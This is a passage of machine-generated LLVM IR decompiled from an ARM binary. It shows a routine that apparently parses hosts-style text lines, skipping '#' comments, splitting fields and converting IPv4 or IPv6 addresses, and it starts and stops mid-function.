  store i32 ptrtoint ([11 x i8]* @global_var_17c8c.610 to i32), i32* @r0, align 4
  %v3_14358 = call i32 @function_cd94(i32 ptrtoint ([11 x i8]* @global_var_17c8c.610 to i32), i32 ptrtoint (i32* @global_var_17c28.576 to i32))
  %v2_1435c = icmp eq i32 %v3_14358, 0
  store i32 ptrtoint (i32* @global_var_17c28.576 to i32), i32* @r1, align 4
  br i1 %v2_1435c, label %bb2, label %bb

bb:                                               ; preds = %dec_label_pc_1434c
  ret i32 %v3_14358

bb2:                                              ; preds = %dec_label_pc_1434c
  store i32 ptrtoint ([18 x i8]* @global_var_17c98.612 to i32), i32* @r0, align 4
  %v2_1436c = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_1436c, i32* @lr, align 4
  %v3_14370 = call i32 @function_cd94(i32 ptrtoint ([18 x i8]* @global_var_17c98.612 to i32), i32 ptrtoint (i32* @global_var_17c28.576 to i32))
  ret i32 %v3_14370

; uselistorder directives
  uselistorder i32 (i32, i32)* @function_cd94, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 114, { 2, 0, 1 }
  uselistorder i32 ptrtoint (i32* @global_var_17c28.576 to i32), { 1, 4, 0, 5, 2, 6, 3, 7 }
}

define i32 @function_14380() local_unnamed_addr {
dec_label_pc_14380:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp53 = call i32 @__decompiler_undefined_function_0()
  %tmp56 = call i32 @__decompiler_undefined_function_0()
  %tmp57 = call i32 @__decompiler_undefined_function_0()
  %tmp61 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-64 = alloca i32, align 4
  %v3_14380 = load i32, i32* @r4, align 4
  %v6_14380 = load i32, i32* @r5, align 4
  %v12_14380 = load i32, i32* @r7, align 4
  %v15_14380 = load i32, i32* @r8, align 4
  %v21_14380 = load i32, i32* @sl, align 4
  %v24_14380 = load i32, i32* @fp, align 4
  store i32 %tmp61, i32* @r4, align 4
  %v1_1438c = sub i32 0, %tmp61
  %v1_14390 = urem i32 %v1_1438c, 4
  store i32 %v1_14390, i32* %ip.global-to-local, align 4
  %v2_14390 = icmp eq i32 %v1_14390, 0
  %v0_14394 = load i32, i32* @r2, align 4
  %v0_14398 = load i32, i32* @r0, align 4
  %v0_1439c = load i32, i32* @r1, align 4
  %v0_143a0 = load i32, i32* @r3, align 4
  store i32 %v0_143a0, i32* %stack_var_-64, align 4
  store i32 %tmp57, i32* %r2.global-to-local, align 4
  br i1 %v2_14390, label %dec_label_pc_143c0, label %dec_label_pc_143b0

dec_label_pc_143b0:                               ; preds = %dec_label_pc_14380
  %v2_143b0 = sub i32 %tmp57, %v1_14390
  %v3_143b0 = icmp ult i32 %tmp57, %v1_14390
  br i1 %v3_143b0, label %dec_label_pc_14694, label %dec_label_pc_143b8

dec_label_pc_143b8:                               ; preds = %dec_label_pc_143b0
  store i32 %v2_143b0, i32* %r2.global-to-local, align 4
  %v2_143bc = add i32 %v1_14390, %tmp61
  store i32 %v2_143bc, i32* @r4, align 4
  br label %dec_label_pc_143c0

dec_label_pc_143c0:                               ; preds = %dec_label_pc_14380, %dec_label_pc_143b8
  %v0_143d0 = phi i32 [ %tmp61, %dec_label_pc_14380 ], [ %v2_143bc, %dec_label_pc_143b8 ]
  %v0_143d4 = phi i32 [ %tmp57, %dec_label_pc_14380 ], [ %v2_143b0, %dec_label_pc_143b8 ]
  %tmp = icmp ult i32 %v0_143d4, 32
  br i1 %tmp, label %dec_label_pc_14694, label %dec_label_pc_143c8

dec_label_pc_143c8:                               ; preds = %dec_label_pc_143c0
  store i32 %v0_143a0, i32* %r0.global-to-local, align 4
  %v7_143cc = icmp eq i32 %v0_143a0, 1
  %v1_143d0 = add i32 %v0_143d0, 32
  store i32 %v1_143d0, i32* @fp, align 4
  %v1_143d4 = add i32 %v0_143d4, -32
  store i32 %v1_143d4, i32* @r8, align 4
  br i1 %v7_143cc, label %dec_label_pc_14500, label %dec_label_pc_143dc

dec_label_pc_143dc:                               ; preds = %dec_label_pc_143c8
  store i32 %tmp56, i32* %r1.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v2_143e8 = inttoptr i32 %tmp56 to i32*
  store i32 -1, i32* %v2_143e8, align 4
  %tmp80 = icmp ult i32 %v1_143d4, 4
  br i1 %tmp80, label %dec_label_pc_14694, label %dec_label_pc_143f0

dec_label_pc_143f0:                               ; preds = %dec_label_pc_143dc
  %v0_143f0 = load i32, i32* %r2.global-to-local, align 4
  %v1_143f0 = add i32 %v0_143f0, -36
  store i32 %v1_143f0, i32* %r3.global-to-local, align 4
  %tmp81 = icmp ult i32 %v1_143f0, 8
  br i1 %tmp81, label %dec_label_pc_14694, label %dec_label_pc_143fc

dec_label_pc_143fc:                               ; preds = %dec_label_pc_143f0
  %v0_143fc = load i32, i32* @r8, align 4
  %tmp82 = icmp ult i32 %v0_143fc, 16
  br i1 %tmp82, label %dec_label_pc_14694, label %dec_label_pc_14404

dec_label_pc_14404:                               ; preds = %dec_label_pc_143fc
  %v1_14404 = add i32 %v0_143f0, -48
  store i32 %v1_14404, i32* %r3.global-to-local, align 4
  %tmp83 = icmp ult i32 %v1_14404, 8
  br i1 %tmp83, label %dec_label_pc_14694, label %dec_label_pc_14410

dec_label_pc_14410:                               ; preds = %dec_label_pc_14404
  %v1_14410 = add i32 %v0_143f0, -44
  store i32 %v1_14410, i32* @r8, align 4
  %v1_14414 = add i32 %v0_143f0, -56
  store i32 %v1_14414, i32* %r3.global-to-local, align 4
  %v3_14418 = icmp ult i32 %v1_14414, %v1_14410
  br i1 %v3_14418, label %.thread1, label %bb

bb:                                               ; preds = %dec_label_pc_14410
  %v1_14420 = load i32, i32* @r4, align 4
  %v2_14420 = add i32 %v1_14420, 44
  br label %bb74

.thread1:                                         ; preds = %dec_label_pc_14410
  store i32 %v1_14414, i32* @r8, align 4
  %v1_14424.pre = load i32, i32* @r4, align 4
  %v2_14424 = add i32 %v1_14424.pre, 56
  br label %bb74

bb74:                                             ; preds = %bb, %.thread1
  %storemerge = phi i32 [ %v2_14424, %.thread1 ], [ %v2_14420, %bb ]
  %v0_1442c = phi i32 [ %v1_14424.pre, %.thread1 ], [ %v1_14420, %bb ]
  %v0_14428 = phi i32 [ %v1_14414, %.thread1 ], [ %v1_14410, %bb ]
  store i32 %storemerge, i32* @r5, align 4
  %v1_1442c = add i32 %v0_1442c, 36
  store i32 %v1_1442c, i32* @r6, align 4
  %v1_14430 = add i32 %v0_1442c, 48
  store i32 %v1_14430, i32* %sl.global-to-local, align 4
  %tmp84 = icmp ult i32 %v0_14428, 80
  br i1 %tmp84, label %dec_label_pc_14694, label %dec_label_pc_14438

dec_label_pc_14438:                               ; preds = %bb74
  %v0_14438 = call i32 @function_1434c()
  store i32 %v0_14438, i32* %r0.global-to-local, align 4
  %v2_1443c = icmp eq i32 %v0_14438, 0
  br i1 %v2_1443c, label %dec_label_pc_14458, label %.thread

.thread:                                          ; preds = %dec_label_pc_14438
  %v1_14444 = load i32, i32* @fp, align 4
  store i32 %v1_14444, i32* @r7, align 4
  %v1_14448 = load i32, i32* @r5, align 4
  store i32 %v1_14448, i32* @fp, align 4
  %v1_1444c = load i32, i32* @r6, align 4
  %v1_14450 = load i32, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_1450c

dec_label_pc_14458:                               ; preds = %dec_label_pc_14438
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %tmp53, i32* %r2.global-to-local, align 4
  %v2_14460 = inttoptr i32 %tmp53 to i32*
  store i32 0, i32* %v2_14460, align 4
  %v0_14464 = call i32 @function_cc08()
  store i32 %v0_14464, i32* %r0.global-to-local, align 4
  %v1_14468 = inttoptr i32 %v0_14464 to i32*
  %v2_14468 = load i32, i32* %v1_14468, align 4
  store i32 %v2_14468, i32* @sl, align 4
  br label %dec_label_pc_14698

dec_label_pc_14470:                               ; preds = %dec_label_pc_14620
  %v0_14470 = load i32, i32* @r4, align 4
  %v1_14470 = add i32 %v0_14470, 4
  %v2_14470 = inttoptr i32 %v1_14470 to i32*
  %v3_14470 = load i32, i32* %v2_14470, align 4
  %v1_14474 = load i32, i32* @sb, align 4
  %v2_14474 = inttoptr i32 %v1_14474 to i32*
  store i32 %v3_14470, i32* %v2_14474, align 4
  store i32 %stack_var_-48.1, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 %tmp53, i32* %ip.global-to-local, align 4
  %v0_14488 = load i32, i32* @r4, align 4
  %v1_14488 = add i32 %v0_14488, 8
  store i32 %v1_14488, i32* %r1.global-to-local, align 4
  %v1_1448c = load i32, i32* @sb, align 4
  %v2_1448c = add i32 %v1_1448c, 8
  %v3_1448c = inttoptr i32 %v2_1448c to i32*
  store i32 2, i32* %v3_1448c, align 4
  %v0_14490 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_14490, i32* @sl, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  %v0_14498 = load i32, i32* @sb, align 4
  %v1_14498 = load i32, i32* %ip.global-to-local, align 4
  %v2_14498 = inttoptr i32 %v1_14498 to i32*
  store i32 %v0_14498, i32* %v2_14498, align 4
  %v0_1449c = load i32, i32* @r7, align 4
  %v1_1449c = load i32, i32* %r0.global-to-local, align 4
  %v2_1449c = inttoptr i32 %v1_1449c to i32*
  store i32 %v0_1449c, i32* %v2_1449c, align 4
  %v0_144a0 = load i32, i32* %r3.global-to-local, align 4
  %v1_144a0 = load i32, i32* @sb, align 4
  %v2_144a0 = add i32 %v1_144a0, 12
  %v3_144a0 = inttoptr i32 %v2_144a0 to i32*
  store i32 %v0_144a0, i32* %v3_144a0, align 4
  %v0_144a4 = load i32, i32* %r0.global-to-local, align 4
  %v1_144a4 = load i32, i32* @sb, align 4
  %v2_144a4 = add i32 %v1_144a4, 16
  %v3_144a4 = inttoptr i32 %v2_144a4 to i32*
  store i32 %v0_144a4, i32* %v3_144a4, align 4
  %v0_144a8 = load i32, i32* %r1.global-to-local, align 4
  %v1_144a8 = load i32, i32* @sb, align 4
  %v2_144a8 = add i32 %v1_144a8, 4
  %v3_144a8 = inttoptr i32 %v2_144a8 to i32*
  store i32 %v0_144a8, i32* %v3_144a8, align 4
  %v0_144ac = load i32, i32* %r2.global-to-local, align 4
  %v1_144ac = load i32, i32* %r0.global-to-local, align 4
  %v2_144ac = add i32 %v1_144ac, 4
  %v3_144ac = inttoptr i32 %v2_144ac to i32*
  store i32 %v0_144ac, i32* %v3_144ac, align 4
  br label %dec_label_pc_1467c

dec_label_pc_144b4:                               ; preds = %dec_label_pc_14648
  store i32 %tmp53, i32* %ip.global-to-local, align 4
  %v0_144b8 = load i32, i32* @r4, align 4
  %v1_144b8 = add i32 %v0_144b8, 4
  %v2_144b8 = inttoptr i32 %v1_144b8 to i32*
  %v3_144b8 = load i32, i32* %v2_144b8, align 4
  store i32 %v3_144b8, i32* %r3.global-to-local, align 4
  store i32 %stack_var_-40.1, i32* %r0.global-to-local, align 4
  %v0_144c0 = load i32, i32* @sb, align 4
  %v2_144c0 = inttoptr i32 %tmp53 to i32*
  store i32 %v0_144c0, i32* %v2_144c0, align 4
  store i32 %v0_14518, i32* %ip.global-to-local, align 4
  %v0_144c8 = load i32, i32* %r3.global-to-local, align 4
  %v1_144c8 = load i32, i32* @sb, align 4
  %v2_144c8 = inttoptr i32 %v1_144c8 to i32*
  store i32 %v0_144c8, i32* %v2_144c8, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v0_144d4 = load i32, i32* %ip.global-to-local, align 4
  %v1_144d4 = load i32, i32* %r0.global-to-local, align 4
  %v2_144d4 = inttoptr i32 %v1_144d4 to i32*
  store i32 %v0_144d4, i32* %v2_144d4, align 4
  %v0_144d8 = load i32, i32* %r3.global-to-local, align 4
  %v1_144d8 = load i32, i32* @sb, align 4
  %v2_144d8 = add i32 %v1_144d8, 12
  %v3_144d8 = inttoptr i32 %v2_144d8 to i32*
  store i32 %v0_144d8, i32* %v3_144d8, align 4
  store i32 10, i32* %r0.global-to-local, align 4
  store i32 %stack_var_-40.1, i32* %r3.global-to-local, align 4
  %v0_144e4 = load i32, i32* @r4, align 4
  %v1_144e4 = add i32 %v0_144e4, 8
  store i32 %v1_144e4, i32* %r1.global-to-local, align 4
  %v0_144e8 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_144e8, i32* @sl, align 4
  %v1_144ec = load i32, i32* @sb, align 4
  %v2_144ec = add i32 %v1_144ec, 8
  %v3_144ec = inttoptr i32 %v2_144ec to i32*
  store i32 10, i32* %v3_144ec, align 4
  %v0_144f0 = load i32, i32* %r3.global-to-local, align 4
  %v1_144f0 = load i32, i32* @sb, align 4
  %v2_144f0 = add i32 %v1_144f0, 16
  %v3_144f0 = inttoptr i32 %v2_144f0 to i32*
  store i32 %v0_144f0, i32* %v3_144f0, align 4
  %v0_144f4 = load i32, i32* %r1.global-to-local, align 4
  %v1_144f4 = load i32, i32* @sb, align 4
  %v2_144f4 = add i32 %v1_144f4, 4
  %v3_144f4 = inttoptr i32 %v2_144f4 to i32*
  store i32 %v0_144f4, i32* %v3_144f4, align 4
  %v0_144f8 = load i32, i32* %r2.global-to-local, align 4
  %v1_144f8 = load i32, i32* %r3.global-to-local, align 4
  %v2_144f8 = add i32 %v1_144f8, 4
  %v3_144f8 = inttoptr i32 %v2_144f8 to i32*
  store i32 %v0_144f8, i32* %v3_144f8, align 4
  br label %dec_label_pc_1467c

dec_label_pc_14500:                               ; preds = %dec_label_pc_143c8
  store i32 0, i32* @r7, align 4
  %.pre = inttoptr i32 %tmp56 to i32*
  br label %dec_label_pc_1450c

dec_label_pc_1450c:                               ; preds = %.thread, %dec_label_pc_14500
  %v2_1451c.pre-phi = phi i32* [ %v2_143e8, %.thread ], [ %.pre, %dec_label_pc_14500 ]
  %v0_14518 = phi i32 [ %v1_14444, %.thread ], [ 0, %dec_label_pc_14500 ]
  %stack_var_-40.1 = phi i32 [ %v1_14450, %.thread ], [ 0, %dec_label_pc_14500 ]
  %stack_var_-48.1 = phi i32 [ %v1_1444c, %.thread ], [ 0, %dec_label_pc_14500 ]
  %stack_var_-52.0 = phi i32 [ %v0_14438, %.thread ], [ %v0_14398, %dec_label_pc_14500 ]
  store i32 1, i32* %r3.global-to-local, align 4
  store i32 %tmp56, i32* %ip.global-to-local, align 4
  store i32 1, i32* @sl, align 4
  store i32 1, i32* %v2_1451c.pre-phi, align 4
  %v2_145e0 = inttoptr i32 %v0_1439c to i8*
  %v7_14618 = icmp eq i32 %v0_14394, 2
  %v7_14640 = icmp eq i32 %v0_14394, 10
  br label %dec_label_pc_14664

dec_label_pc_14524:                               ; preds = %dec_label_pc_14664
  %v0_14524 = load i32, i32* @fp, align 4
  store i32 %v0_14524, i32* %r0.global-to-local, align 4
  store i32 35, i32* %r1.global-to-local, align 4
  %v2_1452c = call i32 @function_1476c(i32 %v0_14524, i32 35)
  store i32 %v2_1452c, i32* %r0.global-to-local, align 4
  %v3_14530 = icmp eq i32 %v2_1452c, 0
  br i1 %v3_14530, label %.thread10, label %bb75

.thread10:                                        ; preds = %dec_label_pc_14524
  %v0_1453811 = load i32, i32* @fp, align 4
  store i32 %v0_1453811, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r6, align 4
  br label %dec_label_pc_145a4.preheader

bb75:                                             ; preds = %dec_label_pc_14524
  %v3_1452c = inttoptr i32 %v2_1452c to i8*
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_14538 = load i32, i32* @fp, align 4
  store i32 %v0_14538, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r6, align 4
  store i8 0, i8* %v3_1452c, align 1
  %v0_145a430.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_145a4.preheader

dec_label_pc_145a4.preheader:                     ; preds = %bb75, %.thread10
  %v0_145a430 = phi i32 [ %v0_145a430.pre, %bb75 ], [ %v0_1453811, %.thread10 ]
  %v1_145a431 = inttoptr i32 %v0_145a430 to i8*
  %v2_145a432 = load i8, i8* %v1_145a431, align 1
  %v3_145a433 = zext i8 %v2_145a432 to i32
  store i32 %v3_145a433, i32* %r3.global-to-local, align 4
  %v2_145a834 = icmp eq i8 %v2_145a432, 0
  br i1 %v2_145a834, label %dec_label_pc_145b0, label %dec_label_pc_14550.preheader

dec_label_pc_14548:                               ; preds = %dec_label_pc_1455c
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_1454c = inttoptr i32 %v8_14574 to i8*
  store i8 0, i8* %v3_1454c, align 1
  %v4_1454c = load i32, i32* %r2.global-to-local, align 4
  %v5_1454c = add i32 %v4_1454c, 1
  store i32 %v5_1454c, i32* %r2.global-to-local, align 4
  %v1_14550 = inttoptr i32 %v5_1454c to i8*
  %v2_14550 = load i8, i8* %v1_14550, align 1
  %v3_14550 = zext i8 %v2_14550 to i32
  store i32 %v3_14550, i32* %r1.global-to-local, align 4
  %v2_14554 = icmp eq i8 %v2_14550, 0
  br i1 %v2_14554, label %dec_label_pc_145b0, label %dec_label_pc_1455c

dec_label_pc_1455c:                               ; preds = %dec_label_pc_14550.preheader, %dec_label_pc_14548
  %v8_14574 = phi i32 [ %v5_1454c, %dec_label_pc_14548 ], [ %v0_1455020, %dec_label_pc_14550.preheader ]
  %v1_14564 = phi i32 [ %v3_14550, %dec_label_pc_14548 ], [ %v3_1455023, %dec_label_pc_14550.preheader ]
  %v2_14560 = load i32, i32* @global_var_18428, align 4
  store i32 %v2_14560, i32* %r3.global-to-local, align 4
  %v3_14564 = mul nuw nsw i32 %v1_14564, 2
  %v4_14564 = add i32 %v3_14564, %v2_14560
  %v5_14564 = inttoptr i32 %v4_14564 to i8*
  %v6_14564 = load i8, i8* %v5_14564, align 1
  %v8_14564 = zext i8 %v6_14564 to i32
  store i32 %v8_14564, i32* %r3.global-to-local, align 4
  %v1_14568 = and i32 %v8_14564, 32
  %v2_14568 = icmp eq i32 %v1_14568, 0
  br i1 %v2_14568, label %dec_label_pc_14570, label %dec_label_pc_14548

dec_label_pc_14570:                               ; preds = %dec_label_pc_1455c
  %v0_14570 = load i32, i32* @r6, align 4
  %v7_14574 = icmp slt i32 %v0_14570, 7
  br i1 %v7_14574, label %bb76, label %dec_label_pc_14584.preheader

bb76:                                             ; preds = %dec_label_pc_14570
  %v9_14574 = load i32, i32* @r4, align 4
  %v13_14574 = mul i32 %v0_14570, 4
  %v14_14574 = add i32 %v9_14574, %v13_14574
  %v15_14574 = inttoptr i32 %v14_14574 to i32*
  store i32 %v8_14574, i32* %v15_14574, align 4
  %v8_14578 = load i32, i32* @r6, align 4
  %v9_14578 = add i32 %v8_14578, 1
  store i32 %v9_14578, i32* @r6, align 4
  %v0_1458425.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_14584.preheader

dec_label_pc_14584.preheader:                     ; preds = %bb76, %dec_label_pc_14570
  %v0_1458425 = phi i32 [ %v0_1458425.pre, %bb76 ], [ %v8_14574, %dec_label_pc_14570 ]
  %v1_1458426 = inttoptr i32 %v0_1458425 to i8*
  %v2_1458427 = load i8, i8* %v1_1458426, align 1
  %v3_1458428 = zext i8 %v2_1458427 to i32
  store i32 %v3_1458428, i32* %r1.global-to-local, align 4
  %v2_1458829 = icmp eq i8 %v2_1458427, 0
  br i1 %v2_1458829, label %dec_label_pc_145a4.loopexit, label %dec_label_pc_14590.lr.ph

dec_label_pc_14590.lr.ph:                         ; preds = %dec_label_pc_14584.preheader
  %v2_14594.pre = load i32, i32* @global_var_18428, align 4
  br label %dec_label_pc_14590

dec_label_pc_14580:                               ; preds = %dec_label_pc_14590
  %v1_14580 = add i32 %v0_14580, 1
  store i32 %v1_14580, i32* %r2.global-to-local, align 4
  %v1_14584 = inttoptr i32 %v1_14580 to i8*
  %v2_14584 = load i8, i8* %v1_14584, align 1
  %v3_14584 = zext i8 %v2_14584 to i32
  store i32 %v3_14584, i32* %r1.global-to-local, align 4
  %v2_14588 = icmp eq i8 %v2_14584, 0
  br i1 %v2_14588, label %dec_label_pc_145a4.loopexit, label %dec_label_pc_14590

dec_label_pc_14590:                               ; preds = %dec_label_pc_14590.lr.ph, %dec_label_pc_14580
  %v0_14580 = phi i32 [ %v0_1458425, %dec_label_pc_14590.lr.ph ], [ %v1_14580, %dec_label_pc_14580 ]
  %v1_14598 = phi i32 [ %v3_1458428, %dec_label_pc_14590.lr.ph ], [ %v3_14584, %dec_label_pc_14580 ]
  store i32 %v2_14594.pre, i32* %r3.global-to-local, align 4
  %v3_14598 = mul nuw nsw i32 %v1_14598, 2
  %v4_14598 = add i32 %v3_14598, %v2_14594.pre
  %v5_14598 = inttoptr i32 %v4_14598 to i8*
  %v6_14598 = load i8, i8* %v5_14598, align 1
  %v8_14598 = zext i8 %v6_14598 to i32
  store i32 %v8_14598, i32* %r3.global-to-local, align 4
  %v1_1459c = and i32 %v8_14598, 32
  %v2_1459c = icmp eq i32 %v1_1459c, 0
  br i1 %v2_1459c, label %dec_label_pc_14580, label %dec_label_pc_145a4.loopexit

dec_label_pc_145a4.loopexit:                      ; preds = %dec_label_pc_14590, %dec_label_pc_14580, %dec_label_pc_14584.preheader
  %v0_145a4 = phi i32 [ %v0_1458425, %dec_label_pc_14584.preheader ], [ %v0_14580, %dec_label_pc_14590 ], [ %v1_14580, %dec_label_pc_14580 ]
  %v1_145a4 = inttoptr i32 %v0_145a4 to i8*
  %v2_145a4 = load i8, i8* %v1_145a4, align 1
  %v3_145a4 = zext i8 %v2_145a4 to i32
  store i32 %v3_145a4, i32* %r3.global-to-local, align 4
  %v2_145a8 = icmp eq i8 %v2_145a4, 0
  br i1 %v2_145a8, label %dec_label_pc_145b0, label %dec_label_pc_14550.preheader

dec_label_pc_14550.preheader:                     ; preds = %dec_label_pc_145a4.preheader, %dec_label_pc_145a4.loopexit
  %v0_1455020 = phi i32 [ %v0_145a4, %dec_label_pc_145a4.loopexit ], [ %v0_145a430, %dec_label_pc_145a4.preheader ]
  %v1_1455021 = inttoptr i32 %v0_1455020 to i8*
  %v2_1455022 = load i8, i8* %v1_1455021, align 1
  %v3_1455023 = zext i8 %v2_1455022 to i32
  store i32 %v3_1455023, i32* %r1.global-to-local, align 4
  %v2_1455424 = icmp eq i8 %v2_1455022, 0
  br i1 %v2_1455424, label %dec_label_pc_145b0, label %dec_label_pc_1455c

dec_label_pc_145b0:                               ; preds = %dec_label_pc_145a4.loopexit, %dec_label_pc_14550.preheader, %dec_label_pc_14548, %dec_label_pc_145a4.preheader
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_145b4 = load i32, i32* @r6, align 4
  %v1_145b8 = load i32, i32* @r4, align 4
  %v5_145b8 = mul i32 %v0_145b4, 4
  %v6_145b8 = add i32 %v1_145b8, %v5_145b8
  %v7_145b8 = inttoptr i32 %v6_145b8 to i32*
  store i32 0, i32* %v7_145b8, align 4
  %v7_145bc = icmp sgt i32 %v0_145b4, 1
  br i1 %v7_145bc, label %dec_label_pc_145c0, label %dec_label_pc_14664

dec_label_pc_145c0:                               ; preds = %dec_label_pc_145b0
  %v2_145c0 = load i32, i32* %stack_var_-64, align 4
  store i32 %v2_145c0, i32* %r0.global-to-local, align 4
  %v7_145c4 = icmp eq i32 %v2_145c0, 1
  br i1 %v7_145c4, label %dec_label_pc_14698, label %dec_label_pc_145cc

dec_label_pc_145cc:                               ; preds = %dec_label_pc_145c0
  %v7_145cc = icmp eq i32 %v2_145c0, 2
  br i1 %v7_145cc, label %dec_label_pc_145d8, label %dec_label_pc_14604.preheader

dec_label_pc_14604.preheader:                     ; preds = %dec_label_pc_145cc
  store i32 1, i32* @r5, align 4
  br label %dec_label_pc_14604

dec_label_pc_145d8:                               ; preds = %dec_label_pc_145cc
  store i32 %v0_1439c, i32* %r0.global-to-local, align 4
  %v0_145dc = load i32, i32* @r4, align 4
  %v1_145dc = inttoptr i32 %v0_145dc to i32*
  %v2_145dc = load i32, i32* %v1_145dc, align 4
  store i32 %v2_145dc, i32* @r1, align 4
  %v3_145e0 = call i32 @function_137d0(i8* %v2_145e0, i32 %v2_145dc)
  store i32 %v3_145e0, i32* %r0.global-to-local, align 4
  %v2_145e4 = icmp eq i32 %v3_145e0, 0
  br i1 %v2_145e4, label %dec_label_pc_14614, label %dec_label_pc_14664

dec_label_pc_145f0:                               ; preds = %dec_label_pc_14604
  %v0_145f0 = load i32, i32* @r4, align 4
  %v4_145f0 = mul i32 %v1_145f0, 4
  %v5_145f0 = add i32 %v0_145f0, %v4_145f0
  %v6_145f0 = inttoptr i32 %v5_145f0 to i32*
  %v7_145f0 = load i32, i32* %v6_145f0, align 4
  store i32 %v7_145f0, i32* %r1.global-to-local, align 4
  %v3_145f4 = call i32 @function_f0f4(i8* %v2_145e0, i32 %v7_145f0)
  store i32 %v3_145f4, i32* %r0.global-to-local, align 4
  %v2_145f8 = icmp eq i32 %v3_145f4, 0
  %v0_145fc = load i32, i32* @r5, align 4
  %v1_145fc = add i32 %v0_145fc, 1
  store i32 %v1_145fc, i32* @r5, align 4
  br i1 %v2_145f8, label %dec_label_pc_14614, label %dec_label_pc_14604

dec_label_pc_14604:                               ; preds = %dec_label_pc_14604.preheader, %dec_label_pc_145f0
  %v1_145f0 = phi i32 [ 1, %dec_label_pc_14604.preheader ], [ %v1_145fc, %dec_label_pc_145f0 ]
  %v1_14604 = load i32, i32* @r6, align 4
  store i32 %v0_1439c, i32* %r0.global-to-local, align 4
  %v5_1460c = icmp slt i32 %v1_145f0, %v1_14604
  br i1 %v5_1460c, label %dec_label_pc_145f0, label %dec_label_pc_14664

dec_label_pc_14614:                               ; preds = %dec_label_pc_145f0, %dec_label_pc_145d8
  store i32 %v0_14394, i32* %r1.global-to-local, align 4
  br i1 %v7_14618, label %dec_label_pc_14620, label %dec_label_pc_1463c

dec_label_pc_14620:                               ; preds = %dec_label_pc_14614
  store i32 2, i32* %r0.global-to-local, align 4
  %v0_14624 = load i32, i32* @r7, align 4
  store i32 %v0_14624, i32* %r2.global-to-local, align 4
  %v0_14628 = load i32, i32* @r4, align 4
  %v1_14628 = inttoptr i32 %v0_14628 to i32*
  %v2_14628 = load i32, i32* %v1_14628, align 4
  store i32 %v2_14628, i32* %r1.global-to-local, align 4
  %v3_1462c = inttoptr i32 %v2_14628 to i8*
  %v4_1462c = call i32 @function_13a8c(i32 2, i8* %v3_1462c, i32 %v0_14624)
  store i32 %v4_1462c, i32* %r0.global-to-local, align 4
  %v5_14634 = icmp sgt i32 %v4_1462c, 0
  br i1 %v5_14634, label %dec_label_pc_14470, label %dec_label_pc_14660

dec_label_pc_1463c:                               ; preds = %dec_label_pc_14614
  store i32 %v0_14394, i32* %r2.global-to-local, align 4
  br i1 %v7_14640, label %dec_label_pc_14648, label %dec_label_pc_14660

dec_label_pc_14648:                               ; preds = %dec_label_pc_1463c
  store i32 10, i32* %r0.global-to-local, align 4
  %v0_1464c = load i32, i32* @r4, align 4
  %v1_1464c = inttoptr i32 %v0_1464c to i32*
  %v2_1464c = load i32, i32* %v1_1464c, align 4
  store i32 %v2_1464c, i32* %r1.global-to-local, align 4
  store i32 %v0_14518, i32* %r2.global-to-local, align 4
  %v3_14654 = inttoptr i32 %v2_1464c to i8*
  %v4_14654 = call i32 @function_13a8c(i32 10, i8* %v3_14654, i32 %v0_14518)
  store i32 %v4_14654, i32* %r0.global-to-local, align 4
  %v5_1465c = icmp sgt i32 %v4_14654, 0
  br i1 %v5_1465c, label %dec_label_pc_144b4, label %dec_label_pc_14660

dec_label_pc_14660:                               ; preds = %dec_label_pc_14620, %dec_label_pc_1463c, %dec_label_pc_14648
  store i32 2, i32* @sl, align 4
  br label %dec_label_pc_14664

dec_label_pc_14664:                               ; preds = %dec_label_pc_14604, %dec_label_pc_145d8, %dec_label_pc_145b0, %dec_label_pc_14660, %dec_label_pc_1450c
  %v0_14664 = load i32, i32* @fp, align 4
  store i32 %v0_14664, i32* %r0.global-to-local, align 4
  %v0_14668 = load i32, i32* @r8, align 4
  store i32 %v0_14668, i32* %r1.global-to-local, align 4
  store i32 %stack_var_-52.0, i32* %r2.global-to-local, align 4
  %v3_14670 = call i32 @function_e500(i32 %v0_14664, i32 %v0_14668, i32 %stack_var_-52.0)
  store i32 %v3_14670, i32* %r0.global-to-local, align 4
  %v2_14674 = icmp eq i32 %v3_14670, 0
  br i1 %v2_14674, label %dec_label_pc_1467c, label %dec_label_pc_14524

dec_label_pc_1467c:                               ; preds = %dec_label_pc_14664, %dec_label_pc_144b4, %dec_label_pc_14470
  %v2_1467c = load i32, i32* %stack_var_-64, align 4
  store i32 %v2_1467c, i32* %r3.global-to-local, align 4
  %v7_14680 = icmp eq i32 %v2_1467c, 1
  br i1 %v7_14680, label %dec_label_pc_14698, label %dec_label_pc_14688

dec_label_pc_14688:                               ; preds = %dec_label_pc_1467c
  store i32 %stack_var_-52.0, i32* %r0.global-to-local, align 4
  %v1_1468c = inttoptr i32 %stack_var_-52.0 to i8*
  %v2_1468c = call i32 @function_cc14(i8* %v1_1468c)
  store i32 %v2_1468c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14698

dec_label_pc_14694:                               ; preds = %dec_label_pc_143b0, %bb74, %dec_label_pc_14404, %dec_label_pc_143fc, %dec_label_pc_143f0, %dec_label_pc_143dc, %dec_label_pc_143c0
  store i32 34, i32* @sl, align 4
  br label %dec_label_pc_14698

dec_label_pc_14698:                               ; preds = %dec_label_pc_145c0, %dec_label_pc_1467c, %dec_label_pc_14688, %dec_label_pc_14458, %dec_label_pc_14694
